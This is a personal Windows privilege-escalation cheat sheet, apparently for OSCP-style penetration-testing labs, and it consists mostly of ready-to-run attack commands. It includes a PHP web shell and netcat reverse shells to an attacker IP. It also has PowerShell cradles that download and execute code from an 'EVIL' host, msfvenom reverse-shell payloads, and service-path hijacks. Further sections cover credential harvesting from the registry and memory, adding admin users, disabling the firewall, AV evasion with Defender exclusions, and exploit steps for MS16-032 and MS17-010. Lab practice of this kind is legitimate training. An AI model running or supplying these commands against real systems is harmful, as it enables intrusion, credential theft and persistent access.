# ariel-shin Windows - Privilege Escalation

## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt/proof.txt

## Summary 
* [Web Shell for Windows](#Web-Shell-for-Windows)
* [File Traversal / Local File Inclusion](#file-traversal--local-file-inclusion)
* [Cracking Passwords](#Cracking-Passwords)
* [RCE to Shell](#RCE-to-Shell)
* [Useful commands](#Useful-commands)
* [Transfer files](#Transfer-files)
* [Process](#Process)
* [Payloads](#Payloads)
* [Compiling Exploits](#Compiling-Exploits)
* [Bypassing AV](#Bypassing-AV)
* [Powershell](#Powershell)
* [Automated Tools](#Automated-Tools)
* [Tricky Exploits](#Tricky-Exploits)
* [Manual Enumeration Walk Through](#Manual-Enumeration-Walk-Through)
* [Resources](#Resources)
* [Nothing is working --> SOS](#nothing-is-working----sos)

## Web Shell for Windows 
PHP Web Shell
- Test if PHP works
```phpinfo
<?php phpinfo(); ?>
```
- Command Execution
```php webshell
<?php echo(system($_GET["cmd"])); ?>
```
- Go to http://victimsite.com/test.php?cmd=dir for command execution 

- Reverse Shell
	* Check Different Ports, e.g. 80, 443

[Back](#summary)

## File Traversal / Local File Inclusion
* Use \~1 with filenames and spaces
* Discover version 
```windows
C:\Windows\System32/license.rtf //for Windows 7
C:\Windows\System32\eula.txt //for Windows XP 
```

[Back](#summary)

## Cracking Passwords
* Google it
* Search on hashkiller.co.uk
* John The Ripper
```
john textfile
```

[Back](#summary)

## RCE to Shell
* Getting a shell in limited interpreters
```cmd1
$ system("start cmd.exe /k $cmd")
```
* Bind cmd to a port
```cmd2
$ nc.exe -Lp 31337 -vv -e cmd.exe
```
* Reverse Shell 
```cmd3
$ nc.exe attacker_ip attacker_port -e cmd.exe
```
* [Invoke Powershell](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)

[Back](#summary)

## Useful commands
* whoami
```
C:\WINDOWS\system32\whoami.exe
```
* Add a new user
```
$ net user test 1234 /add
$ net localgroup administrators test /add
```
* Print files contents
```
$ type file
```
* Change password for user
```
$ net user <user> <password>
```
* Check permissions on a folder recursively
```
$ cacls *.* /t /e /g domainname\administrator:f
```
* Enable RDP Access
```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```
* Disable firewall
```
$ netsh firewall set opmode disable
```
* Powershell
```
powershell

powershell -ExecutionPolicy ByPass -command "& { . whoami }"
```

[Back](#summary)

## Transfer files
### Writable Dirs
* Common Directories
```
C:\WINDOWS\Temp
C:\Inetpub\wwwroot
```
* Look for place reverse shell was uploaded
```
dir shell.asp /s /p
```
* Look for all writeable dirs (LOTS OF OUTPUT)
```
dir /a-r-d /s /b
```

### Methods
* certutil.exe
```
certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
```
* bitsadmin
```
bitsadmin /transfer dejob /download /priority normal http://10.11.0.65/test.exe c:\Users\Public\test.exe
```
* ftp
	* ATTACKER
	```
	apt-get install python-pyftpdlib
	python -m pyftpdlib -p 21
	```
	* VICTIM 
	```
	echo open ATTACKERIP 21>ftp.txt
	echo USER anonymous>>ftp.txt
	echo ftp>>ftp.txt
	echo bin>>ftp.txt
	echo GET file.exe>>ftp.txt
	echo bye>>ftp.txt
	ftp -v -n -s:ftp.txt
	```
	* Links
		* [FTP](https://securism.wordpress.com/oscp-notes-file-transfers/) 
		* [payftpd](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
		* [Transferring files](https://guif.re/windowseop)
* [Bounce port scanning](https://guif.re/windowseop)
```
$ nc $ip 21
220 Femitter FTP Server ready.
USER anonymous
331 Password required for anonymous.
PASS foo
230 User anonymous logged in.
PORT 127,0,0,1,0,80
200 Port command successful.
LIST
```
* [Share folders with RDP](https://guif.re/windowseop)
```
$ rdesktop (ip) -r disk:share=/home/bayo/store
```
* Powershell 
```powershell
$ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"
```
* Powershell Download Cradle
```testingdownload
//check that it echos 
echo "IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1')"

//get rid of single quotes and pipe it - ippsec bastard video 23:10
echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | powershell -noprofile -
```
* Links
	* [Kali to Windows](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
	* [15 ways to download a file](https://blog.netspi.com/15-ways-to-download-a-file/)

[Back](#summary)

## Process
- systeminfo
	* Gives us system info 
	* Check Hot Fixes
		* No hot fixes - means no hotfixes installed OR we don't have permissions to view hot fixes
	* Check OS Name
		* google: systeminfo "OS" + "NIC(s) installed"
			* example: "Microosft Windows Server 2008 R2 DataCenter" + "NIC(s) installed"
		* check if someone else has posted systeminfo output so we can compare our OS version 
	* Check OS Versions 
		* Indicate the Service Pack -- N/A
		```systeminfo
		systeminfo | findstr /B /C:”OS Name” /C:”OS Version”
		```
		* Google Output
	* Windows Server 2003 && IIS 6.0 Privilege Escalation
		* [Useful Exploits](https://guif.re/windowseop)
	* Windows MS11-080
- wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
	* Get architecture
	* x86 = 32 bit machine
	* x64 = 64 bit machine
- Hostname
```
hostname
```
- Environment Variables
	* Command Prompt
	```env
	set
	```
	* PowerShell
	```
	Get-ChildItem Env: | ft Key,Value
	```
- List users
```
$ net user
```
- List info about a user
```
$ net user <username>
```
- Find current user
```
echo %username%
getuid
whoami
```
- See which users are in the Administrator Group
```admin
net localgroup Administrator(s)
```
- Information about a user
```
$ net users Administrator
```
- Which users are on the systems
	* Command Prompt
	```
	net users
	dir /b /ad "C:\Users\"
	dir /b /ad "C:\Documents and Settings\" # Windows XP and below
	```
	* Powershell
	```
	Get-LocalUser | ft Name,Enabled,LastLogon
	Get-ChildItem C:\Users -Force | select Name
	```
- Check who else is logged in
```
qwinsta
```
- Check User Autologon
	* Command Prompt
	```
	reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
	```
	* Powershell
	```
	Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
	```
- Look at system and system32
	```
	cd C:\Windows\system 
	dir system
	//look for files not usually in system32
	//when you install an app, it will create a folder
	//look for installed softwares vuln to privesc
	```
	32 bit files
	```
	cd C:\Windows\system32 
	dir system32
	//look for files not usually in system32
	```

	run tasklist - pulls all running processes
	```
	tasklist
	```
- List running services
	* A service running as Administrator/SYSTEM with incorrect file permissions might allow EOP. 
	* Interested in services wehre permissions are: ***BUILTIN\USERS*** with ***(F)*** or ***(C)*** or ***(M)***
	* Look for services and then google
	```
	net start
	tasklist
	wmic service list brief
	wmic process
	```
	* Look for services running as root (e.g) upnphost
	```
	tasklist /SVC
	```
	* [Fuzzy Security Write-up - nc.exe](http://www.fuzzysecurity.com/tutorials/16.html)
	* [Pentest.blog - Add user](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
	* [Need to upload nc.exe](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	* [EoP 1: Incorrect permissions in services](https://guif.re/windowseop)
	* Print affected services
	```
	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
	```
	* If wmic is not available we can use sc.exe:
	```
	$ sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
	FOR /F %i in (Servicenames.txt) DO echo %i
	type Servicenames.txt
	FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
	FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
	```
	* Can manually check each service use cacls: 
	```
	$ cacls "C:\path\to\file.exe"
	```
	* If you don't have access to vmic, you can do: 
	```
	$ sc qc upnphost
	```
	* Windows XP SP1 is known to be vulnerable to EoP in ***upnphost***. Can get administrator with 
		* WIndows SP0 or SP1 == good chance
	```
	$ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
	$ sc config upnphost obj= ".\LocalSystem" password= ""
	$ sc qc upnphost
	```
	* If it fails because of a missing dependency, run the following: 
	```
	$ sc config SSDPSRV start= auto
	net start SSDPSRV
	net start upnphost
	```
	* OR remove the dependency
		```
		> exploit/windows/local/service_permissions
		```
	* Can also use accesschk.exe
- Processes Running as system
	* ***Do not gloss over! IMPORTANT***
	```systemprocesses
	tasklist /v /fi "username eq system"
	```
- [Check Weak File Permissions](http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet)
```access
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
```
- [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
	```unquoted
	wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
	```
	* [EoP 2: Find unquoted paths](https://guif.re/windowseop)
- [Scheduled Tasks](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	* Option 1 
	```schtasks
	schtasks /query /fo LIST 2>nul | findstr TaskName
	Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
	```
	* Option 2 - fuzzysecurity
	```schtask
	schtasks /query /fo LIST /v
	```
- File Upload
	* Look for files that were present on the webpage
	```
	dir filename /s /p
	```
- Look for Credentials 
	* [Credentials - Method 1](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
	```creds
	cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
	findstr /si password *.xml *.ini *.txt *.config
	findstr /spin "password" *.*
	```
	* [Credentials - Method 2](https://pentestlab.blog/2017/04/19/stored-credentials/
)
	```creds2
	findstr /si password *.txt
	findstr /si password *.xml
	findstr /si password *.ini
	dir /b /s unattend.xml
	dir /b /s web.config
	dir /b /s sysprep.inf
	dir /b /s sysprep.xml
	dir /b /s *pass*
	dir /b /s vnc.ini
	```
	* [Credentials - Method 3]()
	```creds3
	c:\unattend.txt
	c:\sysprep.ini - [Clear Text]
	c:\sysprep\sysprep.xml - [Base64]
	findstr /si password *.txt | *.xml | *.ini
	reg query HKLM /s | findstr /i password > temp.txt
	reg query HKCU /s | findstr /i password > temp.txt
	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s
	```
	* [EoP 3: ClearText passwords (quick hits)](https://guif.re/windowseop)
- [Weak Service Permissions](https://pentestlab.blog/2017/03/30/weak-service-permissions/
)
	* Need to upload accesschk.exe
- [DLL Injection]((https://pentestlab.blog/2017/04/04/dll-injection/)
)
- [Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
	```aie	
	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	```
	* [EoP 6: AlwaysInstallElevated](https://guif.re/windowseop)
- [Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
- [Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
- [Weak Service Permissions](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
	```weak
	wmic service list brief
	```
- [Pass the Hash](https://guif.re/windowseop)
- [Services only available from loopback](https://guif.re/windowseop)
- [Vulnerable Drivers](https://guif.re/windowseop)
- [MORE PAYLOADS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- Network Information
	```
	$ ipconfig /all & route print & arp -a
	```
- List Open Connections
	```netstat
	$ netstat -aton
	```
- Fireswall Information
	```firewall
	$ netsh firewall show state
	$ netsh firewall show config
	```
- Dump NTLM creds from memory
```
fgdump.exe

wce32.exe -w
wce64.exe -2
```

- Look at original low priv exploit code, might have clues as to how to privesc

[Back](#summary)

## Payloads
* x64
	* Stageless
	```
	msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.0.99 lport=443 -f exe -o shell.exe
	```

	Set up Listener in msfvenom
	```
	> use multi/handler
	> set LHOST 10.11.0.99
	> set LPORT 443
	> set payload windows/x64/shell_reverse_tcp
	> run
	```
	* Staged
	```
	msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.21.1.1 lport=443 -f exe -o shell.exe
	```
	Set up Listener in msfvenom
	```
	> use multi/handler
	> set LHOST 10.11.0.99
	> set LPORT 443
	> set windows/x64/meterpreter/reverse_tcp
	> run
	```
* x86
	* Stageless
	```
	msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
	```
	Set up Listener in msfvenom
	```
	> use multi/handler
	> set LHOST 10.11.0.99
	> set LPORT 443
	> set payload windows/shell_reverse_tcp
	> run
	```
	* Staged
	```
	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
	```
	Set up Listener in msfvenom
	```
	> use multi/handler
	> set LHOST 10.11.0.99
	> set LPORT 443
	> set payload windows/meterpreter/reverse_tcp
	> run
	```

[Back](#summary)

## Compiling Exploits
* gcc
``` 
gcc exploit.c -o exploit
./exploit
```
* mingw32 - windows cross-compiler
``` 
apt-get install mingw-w64
i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe
```
[Back](#summary)

## Bypassing AV
* Textbook
```
~# cp shell_reverse_msf_encoded_embedded.exe backdoor.exe
~# cp /usr/share/windows-binaries/Hyperion-1.0.zip .
~# unzip Hyperion-1.0.zipcd Hyperion-1.0/
~# cd Hyperion-1.0/
~/Hyperion-1.0# i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1- win32/libgcc_s_sjlj-1.dll .
~/Hyperion-1.0# cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++- 6.dll .
~/Hyperion-1.0# wine hyperion.exe ../backdoor.exe ../crypted.exe
```
* Online
```
$ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe

```
* Add a file/folder to Windows Defender exclusion list 
```
C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\Tools'"
```

[Back](#summary)

## Powershell
* Check for Powershell
```
powershell
$PSVersionTable
$PSVersionTable.PSVersion
powershell -ExecutionPolicy ByPass -command "& { . whoami }"
```
* Download PowerUp
	```
	IEX(New-Object Net.WebClient).downloadString('http://10.10.MY.IP/Powersploit/PowerUp.ps1')
	Invoke-AllChecks
	```
	* [PowerUp](https://github.com/PowerShellMafia/PowerSploit)
		* Get-GPPPassword
		* Get-UnattendedInstallFile
		* Get-Webconfig
		* Get-ApplicationHost
		* Get-SiteListPassword
		* Get-CachedGPPPassword
		* Get-RegistryAutoLogon
	* [More commands](#Automated-Tools)
* Run Exploit
MS16-032 https://www.exploit-db.com/exploits/39719/
```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```
* Powershell runas
```
* [Powershell RunAS](https://github.com/gammathc/oscp_material/blob/master/oscp_notes.txt)

echo $username = 'ftp' > runas.ps1
echo $securePassword = ConvertTo-SecureString "foobar23" -AsPlainText -Force  >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo $script = 'c:\windows\system32\cmd.exe' >> runas.ps1
echo Start-Process -WorkingDirectory 'C:\Windows\System32' -FilePath $script  -Credential $credential  >> runas.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
```

[Back](#summary)

## Automated Tools
* [Powerless](https://github.com/M4ximuss/Powerless)
```
certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
Powerless.bat
```
* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
```
python ~/Desktop/Scripts/WindowsPrivEsc/windows-exploit-suggester.py --database ~/Desktop/Scripts/WindowsPrivEsc/2019-08-19-mssb.xls --systeminfo priv-esc/systeminfo.txt > exploit-suggestions.txt 
cat exploit-suggestions.txt | grep [version number of os]
```
* [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
```
windows-privesc-check2.exe --dump -a > dump.txt
```
* [Powershell - Sherlock](https://github.com/rasta-mouse/Sherlock)
```
Sherlock.ps1
//grep -i function Sherlock.ps1
Find-AllVulns
//OR at the end append: Find-AllVulns
```
NEED TO LOOK CLOSELY FOR "Appears Vulnerable"
* [Powershell - Power Up](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
One-liners to download the script and run it directly
```
powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"

powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
```
If ps1 file is downloaded, run these commands
```
powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```
[Back](#summary)

## Tricky Exploits
* MS09-12
	* [Compiled Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS09-012)
	* [Compiled Exploit 2 - Not Tested](https://github.com/egre55/windows-kernel-exploits/tree/master/MS09-012:%20Churrasco)
	* Note: MS09-12 is also called Churrasco
	* Syntax
	```
	pr.exe "command"

	pr.exe "whoami"

	//transfer or find nc.exe 

	pr.exe "nc.exe ATTACKERIP 666 -e C:\WINDOWS\System32\cmd.exe"
	nc -nlvp 666
	```
* MS16-032
	* Check if RDP is enabled
		* If so, run 
		```
		searchsploit -m 39719
		```
		* Run powershell script and new command prompt should spawn
	* If not, use [this repo](https://github.com/khr0x40sh/ms16-032)
	* Still no, 
		```
		searchsploit -m 39719
		//modify line 189 & 333
		change "C:\Windows\System32\cmd.exe" to "C:\shell.exe"
		```
		* Create stageless x64 or x86 reverse shell
		* Upload shell.exe and 39719.ps1 to the victim box
		* Set up listener 
		* Should get a reverse shell as system
		* [More help](https://pentestlab.blog/tag/ms16-032/)
* [Microsoft Windows 8.1 (x86/x64) - 'ahcache.sys' NtApphelpCacheControl Privilege Escalation](https://www.exploit-db.com/exploits/35661)
	* Check if UAC is enabled
	```
	REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
	```
		* 0x0 = off
		* 0x1 = on
		* [More Info](http://support.homeawaysoftware.com/articles/en_US/Article/HASW-Check-or-Change-User-Account-Control-UAC-Status?category=Errors&subdir=propertyplus)
	* Enable UAC
	```
	C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
	```
		* [More Info](https://www.howtogeek.com/howto/windows-vista/enable-or-disable-uac-from-the-windows-vista-command-line/)
* MS17-010
	* Metasploit
		```
		use windows/smb/ms17_010_psexec
		set RHOST $IP 
		run
		```
	* [Original](https://github.com/kyeh0/MS17-010)
	* [How to Compile](https://github.com/a6avind/MS17-010)
	* [Script](https://github.com/3ndG4me/AutoBlue-MS17-010/blob/master/shellcode/shell_prep.sh)

[Back](#summary)


## Manual Enumeration Walk Through
* [Fuzzy Security](http://www.fuzzysecurity.com/tutorials/16.html)
* [Hacking and Security](http://hackingandsecurity.blogspot.in/2017/09/oscp-windows-priviledge-escalation.html)
* [Sushant](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)

[Back](#summary)

## Resources
* [CHECKLIST](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
* [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)
* [Walkthrough](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
* [Alt Walkthrough](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
* [Alt 2 Walkthrough](https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/)
* [Useful Commands for Tools](https://github.com/frizb/Windows-Privilege-Escalation)
[Back](#summary)

## Nothing is working --> SOS
* [Calm down](https://www.youtube.com/watch?v=F28MGLlpP90)
* Walk through this [tutorial](https://guif.re/windowseop)
* Check through this [list of tutorials](https://backdoorshell.gitbooks.io/oscp-useful-links/content/windows-privilege-escalation.html)
* Look for usernames that could have been found
	* Try to add rdp access
	* RDP by guessing credentials
* Google anything running as system 
	* Google any compilation issues

[Back](#summary)